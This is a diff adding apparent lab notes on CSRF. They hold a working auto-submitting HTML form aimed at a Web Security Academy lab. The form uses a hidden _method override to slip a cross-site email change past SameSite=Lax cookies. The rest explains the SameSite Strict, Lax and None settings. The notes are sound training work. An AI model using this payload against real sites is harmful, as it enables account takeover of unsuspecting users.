@@ -1,0 +1,62 @@
+<html>
+    <body>
+        <form action="https://0aba00550306f77b8020f8cb00770011.web-security-academy.net/my-account/change-email" method="GET" id="csrf-form">
+            <input type="hidden" name="_method" value="POST">
+            <input type="hidden" name="email" value="hacker@gmail.com">
+        </form>
+
+        <script>document.forms[0].submit()</script>
+    </body>
+</html>
+
+<!--
+    This will send the request with the GET method, but it will be interpreted as a POST request through the hidden attribute (_method)
+-->
+
+
+<!--
+
+Lax allows the cookie to be sent on some cross-site requests, whereas Strict never allows the cookie to be sent on a cross-site request.
+
+The situations in which Lax cookies can be sent cross-site must satisfy both of the following:
+
+    The request must be a top-level navigation. You can think of this as equivalent to when the URL shown in the URL bar changes, e.g. a user clicking on a link to go to another site.
+    The request method must be safe (e.g. GET or HEAD, but not POST).
+
+For example:
+
+    Let's say a user is on site-a.com and clicks on a link to go to site-b.com. This is a cross-site request. This is a top-level navigation and is a GET request, so Lax cookies are sent to site-b.com. However, Strict cookies are not sent because it is, after all, a cross-site request.
+    The user is on site-a.com and there is an iframe in which site-b.com is loaded. This is a cross-site request, but it's not a top-level navigation (the user is still on site-a.com, i.e. the URL bar doesn't change when the iframe is loaded). Therefore neither Lax nor Strict cookies are sent to site-b.com.
+    The user is on site-a.com which POSTs a form to site-b.com. This is a cross-site request, but the method (POST) is unsafe. It doesn't meet the criteria for Lax cookies going cross-site, so neither Lax nor Strict cookies are sent to site-b.com
+
+
+
+## Form Method Spoofing
+
+HTML forms do not support PUT, PATCH, or DELETE actions. So, when defining PUT, PATCH, or DELETE routes that are called from an HTML form, you will need to add a hidden _method field to the form. The value sent with the _method field will be used as the HTTP request method:
+
+
+-->
+
+The SameSite attribute in cookies is used to control how cookies are sent with cross-site requests. It helps improve security and privacy by limiting cookie sharing in certain situations. Here's a breakdown of the different SameSite values:
+
+    SameSite=Strict:
+        The cookie is only sent if the request is coming from the same origin (i.e., the same domain and scheme).
+        This is the most restrictive option. For example, if you're on siteA.com and you click a link that takes you to siteB.com, siteA.com’s cookies won’t be sent along with that request.
+        Use case: It’s useful when you want to ensure cookies are only sent in same-site contexts, like in a user authentication scenario where you don't want cross-site requests to have access to session cookies.
+
+    SameSite=Lax:
+        Cookies are sent on same-site requests and also for top-level navigation to the site (such as clicking a link to your site).
+        However, cookies will not be sent on cross-site subrequests (like loading images, frames, or iframes from another domain).
+        Use case: This is a good middle ground for most websites. It allows cookies for top-level navigation (e.g., logging in via an external link) but still restricts cross-site requests like those from embedded content.
+
+    SameSite=None:
+        Cookies are sent in all contexts, even cross-site requests.
+        This is the least restrictive option, but it requires the cookie to be marked as Secure (i.e., only sent over HTTPS).
+        Use case: Use this when you need your cookies to be sent across sites, such as in third-party authentication systems or when working with cross-site resources.
+
+In short:
+
+    Strict = No cross-site requests with cookies.
+    Lax = Allows cross-site navigation but restricts cross-site subrequests.
+    None = Cookies sent with all requests, including cross-site ones, but must be secure (HTTPS).
